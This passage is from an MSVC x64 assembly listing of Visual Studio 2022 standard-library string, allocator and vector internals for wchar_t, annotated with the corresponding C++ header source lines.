??1_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAA@XZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::~_Bxty
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ
_TEXT	SEGMENT
this$ = 8
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 7

; 2226 :         value_type* _Result = _Bx._Buf;
; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN8@Myptr

; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

	mov	rax, QWORD PTR [rcx]

; 2232 :     }

	ret	0
$LN8@Myptr:

; 2228 :             _Result = _Unfancy(_Bx._Ptr);
; 2229 :         }
; 2230 : 
; 2231 :         return _Result;

	mov	rax, rcx

; 2232 :     }

	ret	0
?_Myptr@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAPEA_WXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Myptr
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
;	COMDAT ?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ PROC ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal, COMDAT

; 2185 :         return _Mypair._Get_first();

	mov	rax, rcx

; 2186 :     }

	ret	0
?_Getal@?$vector@_WV?$allocator@_W@std@@@std@@AEAAAEAV?$allocator@_W@2@XZ ENDP ; std::vector<wchar_t,std::allocator<wchar_t> >::_Getal
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1504 :         return *this;

	mov	rax, rcx

; 1505 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_String_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_String_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z
_TEXT	SEGMENT
_Al$dead$ = 48
_Old_ptr$ = 56
_Capacity$ = 64
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity, COMDAT

; 2641 :         _Alty& _Al, const pointer _Old_ptr, const size_type _Capacity) noexcept {

$LN27:
	sub	rsp, 40					; 00000028H
	mov	rax, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	lea	rdx, QWORD PTR [r8*2+2]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN20@Deallocate

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rax-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN17@Deallocate

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rax, rcx
$LN20@Deallocate:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2644 :     }

	add	rsp, 40					; 00000028H
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 258  :         ::operator delete(_Ptr, _Bytes);

	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN17@Deallocate:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN24@Deallocate:
?_Deallocate_for_capacity@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@CAXAEAV?$allocator@_W@2@QEA_W_K@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Deallocate_for_capacity
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf, COMDAT

; 2292 :             _STD _Destroy_in_place(_Ptr);
; 2293 : 
; 2294 : #if _HAS_CXX20
; 2295 :             // start the lifetime of the array elements
; 2296 :             if (_STD is_constant_evaluated()) {
; 2297 :                 for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2298 :                     _Buf[_Idx] = value_type();
; 2299 :                 }
; 2300 :             }
; 2301 : #endif // _HAS_CXX20
; 2302 :         }

	ret	0
?_Switch_to_buf@_Bxty@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Bxty::_Switch_to_buf
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ
_TEXT	SEGMENT
this$dead$ = 8
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer, COMDAT

; 2248 :         // start the lifetime of the array elements
; 2249 : #if _HAS_CXX20
; 2250 :         if (_STD is_constant_evaluated()) {
; 2251 :             for (size_type _Idx = 0; _Idx < _BUF_SIZE; ++_Idx) {
; 2252 :                 _Bx._Buf[_Idx] = value_type();
; 2253 :             }
; 2254 :         }
; 2255 : #endif // _HAS_CXX20
; 2256 :     }

	ret	0
?_Activate_SSO_buffer@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEAAXXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Activate_SSO_buffer
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ
_TEXT	SEGMENT
this$ = 8
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ PROC ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged, COMDAT

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	QWORD PTR [rcx+24], 7
	seta	al

; 2245 :     }

	ret	0
?_Large_mode_engaged@?$_String_val@U?$_Simple_types@_W@std@@@std@@QEBA_NXZ ENDP ; std::_String_val<std::_Simple_types<wchar_t> >::_Large_mode_engaged
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z
_TEXT	SEGMENT
this$dead$ = 48
_Ptr$ = 56
_Count$ = 64
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z PROC	; std::allocator<wchar_t>::deallocate, COMDAT

; 947  :     _CONSTEXPR20 void deallocate(_Ty* const _Ptr, const size_t _Count) {

$LN23:
	sub	rsp, 40					; 00000028H
	mov	rax, rdx

; 948  :         _STL_ASSERT(_Ptr != nullptr || _Count == 0, "null pointer cannot point to a block of non-zero size");
; 949  :         // no overflow check on the following multiply; we assume _Allocate did that check
; 950  :         _STD _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

	lea	rdx, QWORD PTR [r8+r8]

; 253  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rdx, 4096				; 00001000H
	jb	SHORT $LN17@deallocate

; 174  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

	mov	rcx, QWORD PTR [rax-8]
	add	rdx, 39					; 00000027H

; 175  : 
; 176  :     // If the following asserts, it likely means that we are performing
; 177  :     // an aligned delete on memory coming from an unaligned allocation.
; 178  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 179  : 
; 180  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 181  :     // in range [_Min_back_shift, _Non_user_size]
; 182  : #ifdef _DEBUG
; 183  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 184  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 185  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 186  : #endif // ^^^ !defined(_DEBUG) ^^^
; 187  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

	sub	rax, rcx

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	add	rax, -8
	cmp	rax, 31
	ja	SHORT $LN14@deallocate

; 189  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

	mov	rax, rcx
$LN17@deallocate:

; 258  :         ::operator delete(_Ptr, _Bytes);

	mov	rcx, rax

; 951  :     }

	add	rsp, 40					; 00000028H

; 258  :         ::operator delete(_Ptr, _Bytes);

	jmp	??3@YAXPEAX_K@Z				; operator delete
$LN14@deallocate:

; 188  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN20@deallocate:
?deallocate@?$allocator@_W@std@@QEAAXQEA_W_K@Z ENDP	; std::allocator<wchar_t>::deallocate
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 8
_Right$ = 16
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z PROC	; std::_WChar_traits<wchar_t>::assign, COMDAT

; 295  : #if _HAS_CXX20
; 296  :         if (_STD is_constant_evaluated()) {
; 297  :             return _Primary_char_traits::assign(_Left, _Right);
; 298  :         }
; 299  : #endif // _HAS_CXX20
; 300  :         _Left = _Right;
; 301  :     }

	movzx	eax, WORD PTR [rdx]
	mov	WORD PTR [rcx], ax
	ret	0
?assign@?$_WChar_traits@_W@std@@SAXAEA_WAEB_W@Z ENDP	; std::_WChar_traits<wchar_t>::assign
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
;	COMDAT ?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ
_TEXT	SEGMENT
this$ = 8
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ PROC ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first, COMDAT

; 1504 :         return *this;

	mov	rax, rcx

; 1505 :     }

	ret	0
?_Get_first@?$_Compressed_pair@V?$allocator@_W@std@@V?$_Vector_val@U?$_Simple_types@_W@std@@@2@$00@std@@QEAAAEAV?$allocator@_W@2@XZ ENDP ; std::_Compressed_pair<std::allocator<wchar_t>,std::_Vector_val<std::_Simple_types<wchar_t> >,1>::_Get_first
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ?assign@?$_Char_traits@_WG@std@@SAXAEA_WAEB_W@Z
_TEXT	SEGMENT
_Left$ = 8
_Right$ = 16
?assign@?$_Char_traits@_WG@std@@SAXAEA_WAEB_W@Z PROC	; std::_Char_traits<wchar_t,unsigned short>::assign, COMDAT

; 181  : #if _HAS_CXX20
; 182  :         if (_STD is_constant_evaluated()) {
; 183  :             _STD construct_at(_STD addressof(_Left), _Right);
; 184  :         } else
; 185  : #endif // _HAS_CXX20
; 186  :         {
; 187  :             _Left = _Right;
; 188  :         }
; 189  :     }

	movzx	eax, WORD PTR [rdx]
	mov	WORD PTR [rcx], ax
	ret	0
?assign@?$_Char_traits@_WG@std@@SAXAEA_WAEB_W@Z ENDP	; std::_Char_traits<wchar_t,unsigned short>::assign
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
;	COMDAT ??$_Get_unwrapped@AEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@@std@@YA?A_TAEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@0@@Z
_TEXT	SEGMENT
_It$ = 8
??$_Get_unwrapped@AEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@@std@@YA?A_TAEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@0@@Z PROC ; std::_Get_unwrapped<std::_String_iterator<std::_String_val<std::_Simple_types<char> > > &>, COMDAT

; 1305 :     // unwrap an iterator previously subjected to _Adl_verify_range or otherwise validated
; 1306 :     if constexpr (is_pointer_v<decay_t<_Iter>>) { // special-case pointers and arrays
; 1307 :         return _It + 0;
; 1308 :     } else if constexpr (_Unwrappable_v<_Iter>) {
; 1309 :         return static_cast<_Iter&&>(_It)._Unwrapped();

	mov	rax, QWORD PTR [rcx]

; 1310 :     } else {
; 1311 :         return static_cast<_Iter&&>(_It);
; 1312 :     }
; 1313 : }

	ret	0
??$_Get_unwrapped@AEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@@std@@YA?A_TAEAV?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@0@@Z ENDP ; std::_Get_unwrapped<std::_String_iterator<std::_String_val<std::_Simple_types<char> > > &>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring
;	COMDAT ??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z
_TEXT	SEGMENT
this$ = 64
_First$ = 72
_Last$ = 80
_Al$dead$ = 88
??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z PROC ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_String_iterator<std::_String_val<std::_Simple_types<char> > >,0>, COMDAT

; 2590 :         : _Mypair(_One_then_variadic_args_t{}, _Al) {

$LN155:
	mov	QWORD PTR [rsp+16], rbx
	mov	QWORD PTR [rsp+24], rbp
	push	rsi
	push	rdi
	push	r14
	sub	rsp, 32					; 00000020H

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

	xor	r14d, r14d
	xorps	xmm0, xmm0
	mov	ebp, 7

; 2590 :         : _Mypair(_One_then_variadic_args_t{}, _Al) {

	mov	rsi, r8
	mov	rbx, rdx
	mov	rdi, rcx

; 2284 :         _CONSTEXPR20 _Bxty() noexcept : _Buf() {} // user-provided, for fancy pointers

	movups	XMMWORD PTR [rcx], xmm0

; 2309 :     size_type _Myres  = 0; // current storage reserved for string (capacity)

	mov	QWORD PTR [rcx+16], r14
	mov	QWORD PTR [rcx+24], rbp

; 2591 :         _STD _Adl_verify_range(_First, _Last);
; 2592 :         auto _UFirst = _STD _Get_unwrapped(_First);
; 2593 :         auto _ULast  = _STD _Get_unwrapped(_Last);
; 2594 :         if (_UFirst == _ULast) {

	cmp	rdx, r8
	jne	SHORT $LN2@allocator

; 2656 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

	mov	WORD PTR [rcx], r14w

; 2595 :             _Construct_empty();
; 2596 :         } else {

	jmp	$LN99@allocator
$LN2@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 1571 :         return _Last - _First; // assume the iterator will do debug checking

	sub	rsi, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2740 :             if (_Count > max_size()) {

	mov	rax, 9223372036854775806		; 7ffffffffffffffeH
	cmp	rsi, rax
	ja	$LN153@allocator

; 2742 :             }
; 2743 : 
; 2744 :             if (_Count > _Small_string_capacity) {

	cmp	rsi, rbp
	jbe	$LN24@allocator

; 4763 :         const size_type _Masked = _Requested | _Alloc_mask;

	mov	rbp, rsi
	or	rbp, 7
	cmp	rbp, rax

; 4764 :         if (_Masked > _Max) { // the mask overflows, settle for max_size()

	jbe	SHORT $LN31@allocator

; 4765 :             return _Max;

	mov	rbp, rax
	mov	rax, 9223372036854775807		; 7fffffffffffffffH
	lea	rcx, QWORD PTR [rax+rax]
$LN53@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 220  :         if (_Bytes >= _Big_allocation_threshold) {

	cmp	rcx, 4096				; 00001000H
	jb	SHORT $LN55@allocator

; 153  :     const size_t _Block_size = _Non_user_size + _Bytes;

	lea	rax, QWORD PTR [rcx+39]

; 154  :     if (_Block_size <= _Bytes) {

	cmp	rax, rcx
	jbe	$LN138@allocator

; 101  :         return ::operator new(_Bytes);

	mov	rcx, rax
	call	??2@YAPEAX_K@Z				; operator new
	mov	rcx, rax

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	test	rax, rax
	je	$LN65@allocator

; 160  :     void* const _Ptr = reinterpret_cast<void*>((_Ptr_container + _Non_user_size) & ~(_Big_allocation_alignment - 1));

	add	rax, 39					; 00000027H
	and	rax, -32				; ffffffffffffffe0H

; 161  :     static_cast<uintptr_t*>(_Ptr)[-1] = _Ptr_container;

	mov	QWORD PTR [rax-8], rcx

; 222  :             return _Allocate_manually_vector_aligned<_Traits>(_Bytes);

	jmp	SHORT $LN52@allocator
$LN31@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\utility

; 74   :     return _Left < _Right ? _Right : _Left;

	mov	eax, 10
	cmp	rbp, rax
	cmovb	rbp, rax
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	mov	rax, 9223372036854775807		; 7fffffffffffffffH
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2616 :         ++_Capacity; // Take null terminator into consideration

	lea	rcx, QWORD PTR [rbp+1]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 84   :         if (_Count > _Max_possible) {

	cmp	rcx, rax
	ja	SHORT $LN138@allocator

; 85   :             _Throw_bad_array_new_length(); // multiply overflow
; 86   :         }
; 87   :     }
; 88   : 
; 89   :     return _Count * _Ty_size;

	add	rcx, rcx

; 196  :     if (_Bytes == 0) {

	jne	SHORT $LN53@allocator

; 197  :         return nullptr;

	mov	rax, r14
	jmp	SHORT $LN52@allocator
$LN55@allocator:

; 101  :         return ::operator new(_Bytes);

	call	??2@YAPEAX_K@Z				; operator new
$LN52@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2747 :                 _Construct_in_place(_My_data._Bx._Ptr, _New_ptr);

	mov	QWORD PTR [rdi], rax

; 2748 :                 _My_data._Myres = _New_capacity;

	mov	QWORD PTR [rdi+24], rbp
$LN24@allocator:

; 2226 :         value_type* _Result = _Bx._Buf;

	mov	rax, rdi

; 2244 :         return _Myres > _Small_string_capacity;

	cmp	rbp, 7

; 2227 :         if (_Large_mode_engaged()) {

	jbe	SHORT $LN82@allocator

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

	mov	rax, QWORD PTR [rdi]
$LN82@allocator:

; 2759 :             _STD _Copy_n_unchecked4(_STD move(_First), _Count, _Data);

	mov	rdx, rax
	mov	r8, rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility

; 4671 :     for (; _Count != 0; ++_Dest, (void) ++_First, --_Count) {

	test	rsi, rsi
	je	SHORT $LN90@allocator
	npad	1
$LL91@allocator:

; 4672 :         *_Dest = *_First;

	movsx	ecx, BYTE PTR [rbx]
	lea	rbx, QWORD PTR [rbx+1]
	mov	WORD PTR [rdx], cx
	lea	rdx, QWORD PTR [rdx+2]
	sub	r8, 1
	jne	SHORT $LL91@allocator
$LN90@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2760 :             _My_data._Mysize = _Count;

	mov	QWORD PTR [rdi+16], rsi

; 2761 :             _Data[_Count]    = _Elem();

	mov	WORD PTR [rax+rsi*2], r14w
$LN99@allocator:

; 2597 :             if constexpr (_Is_elem_cptr<decltype(_UFirst)>::value) {
; 2598 :                 _Construct<_Construct_strategy::_From_ptr>(
; 2599 :                     _UFirst, _STD _Convert_size<size_type>(static_cast<size_t>(_ULast - _UFirst)));
; 2600 :             } else if constexpr (_Is_cpp17_fwd_iter_v<decltype(_UFirst)>) {
; 2601 :                 const auto _Length = static_cast<size_t>(_STD distance(_UFirst, _ULast));
; 2602 :                 const auto _Count  = _STD _Convert_size<size_type>(_Length);
; 2603 :                 _Construct_from_iter(_STD move(_UFirst), _STD move(_ULast), _Count);
; 2604 :             } else {
; 2605 :                 _Construct_from_iter(_STD move(_UFirst), _STD move(_ULast));
; 2606 :             }
; 2607 :         }
; 2608 :     }

	mov	rbx, QWORD PTR [rsp+72]
	mov	rax, rdi
	mov	rbp, QWORD PTR [rsp+80]
	add	rsp, 32					; 00000020H
	pop	r14
	pop	rdi
	pop	rsi
	ret	0
$LN65@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory

; 159  :     _STL_VERIFY(_Ptr_container != 0, "invalid argument"); // validate even in release since we're doing p[-1]

	call	_invalid_parameter_noinfo_noreturn
	int	3
$LN138@allocator:

; 155  :         _Throw_bad_array_new_length(); // add overflow

	call	?_Throw_bad_array_new_length@std@@YAXXZ	; std::_Throw_bad_array_new_length
	int	3
$LN153@allocator:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xstring

; 2741 :                 _Xlen_string(); // result too long

	call	?_Xlen_string@std@@YAXXZ		; std::_Xlen_string
	int	3
$LN151@allocator:
??$?0V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@std@@$0A@@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@V?$_String_iterator@V?$_String_val@U?$_Simple_types@D@std@@@std@@@1@0AEBV?$allocator@_W@1@@Z ENDP ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> ><std::_String_iterator<std::_String_val<std::_Simple_types<char> > >,0>
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\xutility
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.40.33807\include\vector
